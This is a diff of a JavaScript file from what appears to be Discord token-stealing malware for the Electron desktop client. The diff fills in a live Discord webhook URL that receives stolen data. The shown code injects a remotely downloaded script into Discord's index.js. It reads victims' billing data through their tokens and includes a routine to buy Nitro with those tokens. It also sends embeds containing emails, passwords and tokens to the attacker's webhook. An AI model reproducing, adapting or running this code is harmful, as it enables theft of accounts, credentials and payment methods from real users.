@@ -6,7 +6,7 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%', 
+  webhook: 'https://discord.com/api/webhooks/983003068524298281/wBvYqKPJgR6_d7Pumik8B8w0htJ8DvbNhgMK3tivZAf5XQJOh4xM1t_dF_KiIgfkXy8m', 
   webhook_protector_key: '%WEBHOOK_KEY%', 
   auto_buy_nitro: false, 
   ping_on_run: false, 
@@ -444,7 +444,7 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace('%WEBHOOK%', '${config.webhook}')
+        res.replace('https://discord.com/api/webhooks/983003068524298281/wBvYqKPJgR6_d7Pumik8B8w0htJ8DvbNhgMK3tivZAf5XQJOh4xM1t_dF_KiIgfkXy8m', '${config.webhook}')
         res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
         res.pipe(file);
         file.on('finish', () => {
@@ -493,21 +493,13 @@ const fetchBilling = async (token) => {
 
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
-  if (!data) return '❌';
+  if (!data) return '';
   let billing = '';
   data.forEach((x) => {
     if (!x.invalid) {
-      switch (x.type) {
-        case 1:
-          billing += '💳 ';
-          break;
-        case 2:
-          billing += '<:paypal:951139189389410365> ';
-          break;
-      }
+      billing += ' ';
     }
   });
-  if (!billing) billing = '❌';
   return billing;
 };
 
@@ -535,7 +527,7 @@ const Purchase = async (token, id, _type, _time) => {
 
 const buyNitro = async (token) => {
   const data = await fetchBilling(token);
-  const failedMsg = 'Failed to Purchase ❌';
+  const failedMsg = 'Failed to Purchase ';
   if (!data) return failedMsg;
 
   let IDS = [];
@@ -670,11 +662,6 @@ const login = async (email, password, token) => {
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Billing:',
-            value: `${billing}`,
-            inline: true,
-          },
-          {
             name: '<:944007233820307467:959785232037470208> Email:',
             value: `\`${email}\``,
             inline: true,
@@ -797,7 +784,7 @@ const PaypalAdded = async (token) => {
         fields: [
           {
             name: '**Paypal Added**',
-            value: `Time to buy some nitro baby 😩`,
+            value: `Time to buy some nitro baby `,
             inline: false,
           },
           {
